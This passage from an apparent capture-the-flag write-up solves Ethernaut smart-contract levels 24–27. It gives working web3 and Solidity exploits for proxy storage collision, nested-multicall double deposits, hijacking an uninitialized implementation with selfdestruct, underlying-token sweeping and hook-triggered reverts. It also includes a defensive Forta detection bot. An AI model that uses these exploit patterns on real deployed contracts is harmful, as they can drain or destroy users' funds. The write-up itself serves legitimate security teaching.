    }
  }
}
```

We have an Upgradable Proxy implementation in use here. [Proxies](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies) are a sort of middleman between some logic and your main contract, such that instead of writing that logic in the main contract and thus not being able to upgrade it, you write it in some other contract and make the proxy point there. This way, if that logic needs an update you create a new contract and point the proxy there. `delegatecall` is used to implement this, but you should know by now that life is not easy when you use `delegatecall` without care!

### Storage Collision

The first thing we may notice is that there is a storage collision between proxy and logic.

| slot | proxy          | logic               |
| ---- | -------------- | ------------------- |
| 0    | `pendingAdmin` | `owner`             |
| 1    | `admin`        | `maxBalance`        |
| 2    |                | `whitelisted` (map) |
| 3    |                | `balances` (map)    |

With this exploit in mind, let us see our options:

- If the logic writes to `maxBalance`, it will overwrite `admin` in the proxy. That seems to be a good attack vector to win the game.

- To update `maxBalance`, the wallet balance must be 0 and `msg.sender` must be whitelisted.

- For wallet balance to be 0, we need to drain it somehow.

- To be whitelisted, `addToWhitelist` must be called by the `owner`.

- But hey, `owner` collided with `pendingAdmin` in the proxy, and we can very well overwrite it via `proposeAdmin`! We can add ourselves to the whitelist after becoming the owner.

### Draining the Wallet

The plan seems good so far, but one piece is missing: how do we drain the wallet? Assuming we are both the owner and whitelisted, let's see what we have:

- `deposit` function allows you to deposit, with respect to not exceeding `maxBalance`.
- `execute` function allows you to `call` a function on any address with some value that is within your balance. Without any call data and your address as the destination, this acts like a `withdraw` function.
- `multicall` function allows you to make multiple calls of the above two, in a single transaction. This function is basically the main idea of the entire contract.

The `multicall` function supposedly checks for double spending on `deposit` via a boolean flag; however, this flag works only for one `multicall`! If you were to call `multicall` within a `multicall`, you can bypass it. Since `delegatecall` forwards `msg.value` too, you can put more money than you have to your balance.

### Attack

First things first, let's become the `owner` and whitelist ourselves. Within the console, we are only exposed to the logic contract (`PuzzleWallet`) via `contract` object, but everything goes through proxy first. We can call the functions there by manually giving the calldata.

```js
const functionSelector = "0xa6376746"; // proposeNewAdmin(address)
await web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  data: web3.utils.encodePacked(
    functionSelector,
    web3.utils.padLeft(player, 64),
  ),
});
// confirm that it worked
if (player == (await contract.owner())) {
  // whitelist ourselves
  await contract.addToWhitelist(player);
}
```

The next step is to drain the contract balance. When we check the total balance via `await getBalance(contract.address)` we get `0.001`. So if we somehow deposit `0.001` twice with double-spending, the contract will think total balance to be `0.003` but actually it will be `0.002`. Then we can withdraw our balance alone and the contract balance will be drained.

Here is a schema on how we will arrange the `multicall`s:

```js
// let 'b' denote balance of contract
// call with {value: b}
multicall:[
  deposit(),
  multicall:[
    deposit() // double spending!
  ],
  execute(player, 2 * b, []) // drain contract
]
```

Writing the actual code for this schema:

```js
// contract balance
const _b = web3.utils.toWei(await getBalance(contract.address));
// 2 times contract balance
const _2b = web3.utils.toBN(_b).add(web3.utils.toBN(_b));
await contract.multicall(
  [
    // first deposit
    (await contract.methods["deposit()"].request()).data,
    // multicall for the second deposit
    (
      await contract.methods["multicall(bytes[])"].request([
        // second deposit
        (await contract.methods["deposit()"].request()).data,
      ])
    ).data,
    // withdraw via execute
    (
      await contract.methods["execute(address,uint256,bytes)"].request(
        player,
        _2b,
        [],
      )
    ).data,
  ],
  { value: _b },
);
```

Thanks to the `multicall`, the attack will be executed in a single transaction too :) Afterwards, we can confirm via `await getBalance(contract.address)` that the balance of the contract is now 0.

We are ready for the next step, which is to call `setMaxBalance`. Whatever value we send here will overwrite the `admin` value, so we just convert our address to an `uint256` and call this function:

```js
await contract.setMaxBalance(web3.utils.hexToNumberString(player));
// see that admin value is overwritten
await web3.eth.getStorageAt(contract.address, 1);
```

## 25. [Motorbike](https://ethernaut.openzeppelin.com/level/25)

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/Initializable.sol";

contract Motorbike {
  // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
  bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

  struct AddressSlot {
    address value;
  }

  // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
  constructor(address _logic) public {
    require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
    _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
    (bool success,) = _logic.delegatecall(
      abi.encodeWithSignature("initialize()")
    );
    require(success, "Call failed");
  }

  // Delegates the current call to `implementation`.
  function _delegate(address implementation) internal virtual {
    // solhint-disable-next-line no-inline-assembly
    assembly {
      calldatacopy(0, 0, calldatasize())
      let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
      returndatacopy(0, 0, returndatasize())
      switch result
      case 0 { revert(0, returndatasize()) }
      default { return(0, returndatasize()) }
    }
  }

  // Fallback function that delegates calls to the address returned by `_implementation()`.
  // Will run if no other function in the contract matches the call data
  fallback () external payable virtual {
    _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
  }

  // Returns an `AddressSlot` with member `value` located at `slot`.
  function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
    assembly {
      r_slot := slot
    }
  }
}

contract Engine is Initializable {
  // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
  bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

  address public upgrader;
  uint256 public horsePower;

  struct AddressSlot {
    address value;
  }

  function initialize() external initializer {
    horsePower = 1000;
    upgrader = msg.sender;
  }

  // Upgrade the implementation of the proxy to `newImplementation`
  // subsequently execute the function call
  function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
    _authorizeUpgrade();
    _upgradeToAndCall(newImplementation, data);
  }

  // Restrict to upgrader role
  function _authorizeUpgrade() internal view {
    require(msg.sender == upgrader, "Can't upgrade");
  }

  // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
  function _upgradeToAndCall(
    address newImplementation,
    bytes memory data
  ) internal {
    // Initial upgrade and setup call
    _setImplementation(newImplementation);
    if (data.length > 0) {
      (bool success,) = newImplementation.delegatecall(data);
      require(success, "Call failed");
    }
  }

  // Stores a new address in the EIP1967 implementation slot.
  function _setImplementation(address newImplementation) private {
    require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

    AddressSlot storage r;
    assembly {
      r_slot := _IMPLEMENTATION_SLOT
    }
    r.value = newImplementation;
  }
}
```

We have another proxy-based puzzle here. This time, we see that [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967) is used, which means it is safe against storage collisions. More specifically, EIP-1967 defines a standard storage slot that the proxy uses. As per this standard, the logic contract is stored at `bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)`, which is what we see in the code too.

When we examine the Motorbike contract, we realize that it is just a proxy with its logic being the Engine contract. Engine contract is [Initializable](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializers). There is a question mark here though: the `initializer` is called from the proxy, so the affected storage is that of the Motorbike, not the Engine! Consequently, Motorbike should have the results of initialization in it's storage, while Engine should not.

The `Initializable` contract has 2 storage variables, both 1-byte booleans. The Engine contract has two variables, a 20-byte address and a 32-byte unsigned integer. As per the EVM optimization, 2 booleans and 1 address will all occupy the same slot. So we should see an address and two boolean values side by side at the 0th position.

```js
// Proxy storage
await web3.eth.getStorageAt(contract.address, 0);
// '0x0000000000000000000058ab506795ec0d3bfae4448122afa4cde51cfdd20001'

// Engine address
const _IMPLEMENTATION_SLOT =
  "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
const engineAddress = await web3.eth.getStorageAt(
  contract.address,
  web3.utils.hexToNumberString(_IMPLEMENTATION_SLOT),
);

await web3.eth.getStorageAt(engineAddress, 0);
// '0x0000000000000000000000000000000000000000000000000000000000000000'
```

Indeed, the initializer has mistakenly wrote to the proxy storage! The Engine contract has no idea that it is initialized, so we can call the initialize function there.

```js
await web3.eth.sendTransaction({
  from: player,
  to: engine,
  data: "0x8129fc1c", // initialize()
});
```

If we check the storage of Engine again, we will see that it is updated. We are now the `upgrader` and we can call the `updateToAndCall` function with a new contract of our own, and give `data` to make it `selfdestruct`.

We can write a small contract such as:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract Pwner {
  function pwn() public {
    selfdestruct(address(0));
  }
}
```

The objective is to make this the Engine of the Motorbike, so we will make the call to the proxy. Since our function signature will have no match there, it will be delegated to the Engine and there the new implementation will be our `Pwner` contract. Afterwards, `pwn()` will be called and the new implementation will `selfdestruct`.

```js
const _function = {
  inputs: [
    {
      name: "newImplementation",
      type: "address",
    },
    {
      name: "data",
      type: "bytes",
    },
  ],
  name: "upgradeToAndCall",
  type: "function",
};
const _parameters = [
  "0xad3359eAbEec598f7eBEDdb14BC056ca57fa32B1", // Pwner
  "0xdd365b8b", // pwn()
];
const _calldata = web3.eth.abi.encodeFunctionCall(_function, _parameters);
await web3.eth.sendTransaction({
  from: player,
  to: engineAddress, // not Motorbike!
  data: _calldata,
});
```

We are sending this transaction to Engine instead of Motorbike, because the Engine itself is like a proxy too. Notice in the `_upgradeToAndCall` internal function it makes a `delegatecall` to the `newImplementation`.

What `selfdestruct` within the `newImplementation` achieves here is that it actually destroys the calling Engine, not the Pwner contract! This is again because a `delegatecall` is used. If we check the Engine contract address with block explorer, we will see that it did indeed `selfdestruct`.

## 26. [Double Entry Point](https://ethernaut.openzeppelin.com/level/26)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
  function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
  function setDetectionBot(address detectionBotAddress) external;
  function notify(address user, bytes calldata msgData) external;
  function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
    require(address(usersDetectionBots[msg.sender]) == address(0), "DetectionBot already set");
    usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
      return;
    } catch {}
  }

  function raiseAlert(address user) external override {
    if(address(usersDetectionBots[user]) != msg.sender) return;
    botRaisedAlerts[msg.sender] += 1;
  }
}

contract CryptoVault {
  address public sweptTokensRecipient;
  IERC20 public underlying;

  constructor(address recipient) public {
    sweptTokensRecipient = recipient;
  }

  function setUnderlying(address latestToken) public {
    require(address(underlying) == address(0), "Already set");
    underlying = IERC20(latestToken);
  }

  /*
  ...
  */

  function sweepToken(IERC20 token) public {
    require(token != underlying, "Can't transfer underlying token");
    token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
  }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
  DelegateERC20 public delegate;

  function mint(address to, uint256 amount) public onlyOwner {
    _mint(to, amount);
  }

  function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
    delegate = newContract;
  }

  function transfer(address to, uint256 value) public override returns (bool) {
    if (address(delegate) == address(0)) {
      return super.transfer(to, value);
    } else {
      return delegate.delegateTransfer(to, value, msg.sender);
    }
  }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
  address public cryptoVault;
  address public player;
  address public delegatedFrom;
  Forta public forta;

  constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) public {
    delegatedFrom = legacyToken;
    forta = Forta(fortaAddress);
    player = playerAddress;
    cryptoVault = vaultAddress;
    _mint(cryptoVault, 100 ether);
  }

  modifier onlyDelegateFrom() {
    require(msg.sender == delegatedFrom, "Not legacy contract");
    _;
  }

  modifier fortaNotify() {
    address detectionBot = address(forta.usersDetectionBots(player));

    // Cache old number of bot alerts
    uint256 previousValue = forta.botRaisedAlerts(detectionBot);

    // Notify Forta
    forta.notify(player, msg.data);

    // Continue execution
    _;

    // Check if alarms have been raised
    if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
  }

  function delegateTransfer(
    address to,
    uint256 value,
    address origSender
  ) public override onlyDelegateFrom fortaNotify returns (bool) {
    _transfer(origSender, to, value);
    return true;
  }
}
```

Our task in this level is to find the bug in `CryptoVault` contract, and protect it from being drained out of tokens. Anyways, what is this vault about, and what is `sweepToken`?

- `CryptoVault` is constructed with a recipient address argument.
- A `setUnderlying` function sets a token address as the underlying token. This is a one time operation, as per the `require` line in it checking for the initial value of `underlying`.
- A `sweepToken` function takes a token address as parameter, and transfers the balance of `CryptoVault` to the recipient. "Sweeping" here is to transfer the entire balance of `CryptoVault` about any token other than the underlying token to the recipient. This is commonly done so that the user can get mistakenly sent tokens.

The `contract` object in our console is of the `DoubleEntryPoint` contract, judging by its properties. We wonder what is the underlying token? We can find it as follows:

```js
// find the CryptoVault address from DoubleEntryPoint
const cryptoVaultAddress = await contract.cryptoVault();
// access "IERC20 public underlying;" variable
await web3.eth.getStorageAt(cryptoVaultAddress, 1);
// 0x00000000000000000000000025047168b9c737a03a111ec039438403e73b7507
```

We got the address of DET token, the one we are supposed to protect! so we want to prevent transfer of DET token; but, can we really?

### Sweeping the Underlying Token

If we look at the transfer function of `LegacyToken` contract:

```solidity
function transfer(address to, uint256 value) public override returns (bool) {
  if (address(delegate) == address(0)) {
    return super.transfer(to, value);
  } else {
    return delegate.delegateTransfer(to, value, msg.sender);
  }
}
```

it is actually calling the `delegateTransfer` of some `delegate`. I wonder what is that `delegate`? We can get the address similar to before, but using `call` instead of `getStorageAt`:

```js
// find the LegacyToken address from DoubleEntryPoint
const legacyTokenAddress = await contract.delegatedFrom();
// call the getter of "DelegateERC20 public delegate;"
await web3.eth.call({
  from: player,
  to: legacyTokenAddress,
  data: "0xc89e4361", // delegate()
});
// 0x00000000000000000000000025047168b9c737a03a111ec039438403e73b7507
```

Oh boy, they are the same... This is bad for the underlying token because if someone were to call `sweepToken` with `LegacyToken` as the address, it will cause DET to be swept! Let us do so:

```js
// get the addresses from DoubleEntryPoint
const cryptoVaultAddress = await contract.cryptoVault();
const legacyTokenAddress = await contract.delegatedFrom();

// check initial balance
await contract.balanceOf(cryptoVaultAddress).then((b) => b.toString());

// call sweepToken of CryptoVault with LegacyToken as the parameter
const _function = {
  inputs: [
    {
      name: "token",
      type: "address",
    },
  ],
  name: "sweepToken",
  type: "function",
};
const _parameters = [legacyTokenAddress];
const _calldata = web3.eth.abi.encodeFunctionCall(_function, _parameters);
await web3.eth.sendTransaction({
  from: player,
  to: cryptoVaultAddress,
  data: _calldata,
});

// check balance again to see it be 0
await contract.balanceOf(cryptoVaultAddress).then((b) => b.toString());
```

Boom, DET has been swept.

### Preventing the Attack with Forta Detection Bot

Now, we will prevent this attack with a Forta detection bot. We must look at the Forta contract for this. In particular, our bot must follow the `IDetectionBot` interface, which requests the implementation of a `function handleTransaction(address user, bytes calldata msgData) external`. Indeed, this function is called within the `notify` function of Forta contract. To raise an alert, the bot must call `raiseAlert` function of it's caller (accessed via `msg.sender`) which will be the Forta contract.

How should we prevent this? Well, the attack was made by calling the `sweepToken` function of `CryptoVault` contract with `LegacyToken` contract as the address. Then, a message call to `DoubleEntryPoint` contract is made for the `delegateTransfer` function. That message's data is the one our bot will receive on `handleTransaction`, because `delegateTransfer` is the one with `fortaNotify` modifier. Regarding that function, the only thing we can use for our need is the `origSender`, which will be the address of `CryptoVault` during a sweep. So, our bot can check that value within the calldata and raise an alert if it is the address of `CryptoVault`.

At this point, we need to put special effort into understanding [how the calldata will be structured](https://docs.soliditylang.org/en/v0.8.15/abi-spec.html#abi). We are calling `delegateTransfer` but that is not the calldata our bot will receive. You see, this function has a modifier `fortaNotify`. The modifier is not a message call, but simply replaces code with respect to the execution line (`_;`). During `notify`, the `msg.data` is passed as a parameter, so this has the structure of the calldata shown in the table above.

After `notify`, our detection bot's `handleTransaction` is called with the same `msg.data` passed to `notify`. So, during `handleTransaction`, the calldata will have the actual calldata to call that function, and the `delegateCall` calldata as an argument.

| position      | bytes | type               | value                                                              |
| ------------- | ----- | ------------------ | ------------------------------------------------------------------ |
| `0x00`        | 4     | `bytes4`           | Function selector of `handleTransaction` which is `0x220ab6aa`     |
| `0x04`        | 32    | `address` (padded) | `user` parameter                                                   |
| `0x24`        | 32    | `uint256`          | offset of `msgData` parameter, `0x40` in this case                 |
| `0x44`        | 32    | `uint256`          | length of `msgData` parameter, `0x64` in this case                 |
| `0x64` \*\*\* | 4     | `bytes4`           | Function selector of `delegateTransfer` which is `0x9cd1a121`      |
| `0x68` \*\*\* | 32    | `address` (padded) | `to` parameter                                                     |
| `0x88` \*\*\* | 32    | `uint256`          | `value` parameter                                                  |
| `0xA8` \*\*\* | 32    | `address` (padded) | `origSender` parameter **the one we want**                         |
| `0xC8`        | 28    | padding            | zero-padding as per the 32-byte arguments rule of encoding `bytes` |

The \*\*\* marks the original calldata when `delegateTransfer` is called. For more information on how this is calculated, see to the end of this post where I create a toy-contract to find out the calldata.

Anyways, it is time to write our bot! We will copy-paste the `IDetectionBot` interface, as well as `IForta` interface and `Forta` contract which we will use within to raise an alert.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDetectionBot {
  function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
  function setDetectionBot(address detectionBotAddress) external;
  function notify(address user, bytes calldata msgData) external;
  function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
    require(address(usersDetectionBots[msg.sender]) == address(0), "DetectionBot already set");
    usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
      return;
    } catch {}
  }

  function raiseAlert(address user) external override {
    if(address(usersDetectionBots[user]) != msg.sender) return;
    botRaisedAlerts[msg.sender] += 1;
  }
}

contract MyDetectionBot is IDetectionBot {
  address public cryptoVaultAddress;

  constructor(address _cryptoVaultAddress) {
    cryptoVaultAddress = _cryptoVaultAddress;
  }

  // we can comment out the variable name to silence "unused parameter" error
  function handleTransaction(address user, bytes calldata /* msgData */) external override {
    // extract sender from calldata
    address origSender;
    assembly {
      origSender := calldataload(0xa8)
    }

    // raise alert only if the msg.sender is CryptoVault contract
    if (origSender == cryptoVaultAddress) {
      Forta(msg.sender).raiseAlert(user);
    }
  }
}
```

Upon deploying the detection bot with the correct `CryptoVault` address, we must set the detection bot at the `Forta` contract:

```js
const fortaAddress = await contract.forta();
const detectionBotAddress = "0x63b2a2028E10025843c90DF9dEF2748565f495F0"; // your address here

// call setDetectionBot of Forta with your detection bot address as the parameter
const _function = {
  inputs: [
    {
      name: "detectionBotAddress",
      type: "address",
    },
  ],
  name: "setDetectionBot",
  type: "function",
};
const _parameters = [detectionBotAddress];
const _calldata = web3.eth.abi.encodeFunctionCall(_function, _parameters);
await web3.eth.sendTransaction({
  from: player,
  to: fortaAddress,
  data: _calldata,
});
```

Done!

### About the Calldata

It took me some time to wrap my head around how exactly the calldata was calculated, so I wrote a toy-contract that acts the same:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TestBot {
  bytes public calldataAtHandleTransaction;
  bytes public parameterAtHandleTransaction;

  function handleTransaction(address user, bytes calldata msgData) external {
    calldataAtHandleTransaction = msg.data;
    parameterAtHandleTransaction = msgData;
  }
}

contract TestDet {
  address botAddress;

  constructor(address _botAddress) {
    botAddress = _botAddress;
  }

  function delegateTransfer(
    address addr1, // 0x1111111111111111111111111111111111111111
    uint256 val1,  // 10
    address addr2  // 0x2222222222222222222222222222222222222222
  ) external {
    TestBot(botAddress).handleTransaction(addr1, msg.data);
  }
}
```

If you call `delegateTransfer` of `TestDet` contract, and then check the public variables of `TestBot` you will have a clear look on the calldata and `msgData` argument during `handleTransaction`. Looking at the documentation for ABI Specification, we see that

> `bytes`, of length `k` (which is assumed to be of type `uint256`): `enc(X) = enc(k) pad_right(X)`, i.e. the number of bytes is encoded as a `uint256` followed by the actual value of `X` as a byte sequence, followed by the minimum number of zero-bytes such that `len(enc(X))` is a multiple of 32.

Looking at the calldata of `delegateTransfer`, we have:

- 4 bytes function selector
- 32 bytes address
- 32 bytes unsigned integer
- 32 bytes address

A total of 100 bytes, which is `0x64` in hex. So, in the calldata of `handleTransaction` the length value for `msgData` will be `0x64`. What about the offset value?

> ... for the dynamic types `uint32[]` and `bytes`, we use the offset in bytes to the start of their data area, measured from the start of the value encoding (i.e. not counting the first four bytes containing the hash of the function signature)

At the table above we saw that the position of `msgData` length is at `0x44`. That includes the function signature of `handleTransaction`, so after ignoring it we get the offset value `0x40`.

## 27. [Good Samaritan](https://ethernaut.openzeppelin.com/level/27)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

We are asked to deplete the coins of a Good Samaritan contract. What makes it a good samaritan? Well, it has tons of coins and is willing to donate them, only 10 at a time though. To deplete all 1 million coins of the contract, we would have to take more than 10 at a time.

Thankfully, the author of this level literally gaves us the clue in a comment, under `requestDonation` function at the comment that says: `send the coins left`. Looking at this function, it is a try-catch clause that handles an exception thrown during `wallet.donate10(msg.sender)`. Specifically, if the exception is due to error `NotEnoughBalance();` then it will send all the remaining coins.

How could `donate10` throw an exception? Apparently, it does throw `NotEnoughBalance();` only when there is not enough balance :). However, that is not where the function call ends, it also goes to `coin.transfer`.

Under `coin.transfer` we finally see something that touches our end: if the transfer happens and it is to a contract account, then `notify(uint256 amount)` function is called there to basically let that contract know about this transfer.

Such things are called **hooks**, allowing contracts to run code before / after / during an event, provided that they support the hook function. You can find more about them in [OpenZeppelin docs](https://docs.openzeppelin.com/contracts/3.x/extending-contracts#rules_of_hooks) too.

Looking back, we are supposed to throw `NotEnoughBalance();` during the transfer, and we may very well do that within our `notify` handler. There is a catch though: if you simply do that it will also revert the `transferRemainder` call too. So we can just check if the `amount` is 10, and revert in that case only. Our resulting attacker contract is as follows:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

// interface to call target function
interface IGoodSamaritan {
  function requestDonation() external returns (bool enoughBalance);
}

contract Attack {
  // error signature will be taken from here
  error NotEnoughBalance();

  // entry point for our attack, simply requests a donation
  function pwn(address _addr) external {
     IGoodSamaritan(_addr).requestDonation();
  }

  // notify is called when this contract receives coins
  function notify(uint256 amount) external pure {
    // only revert on 10 coins
    if (amount == 10) {
        revert NotEnoughBalance();
    }
  }
}
```

Once you deploy this and run `pwn` with the target contract's address, it will deplete all the coins.
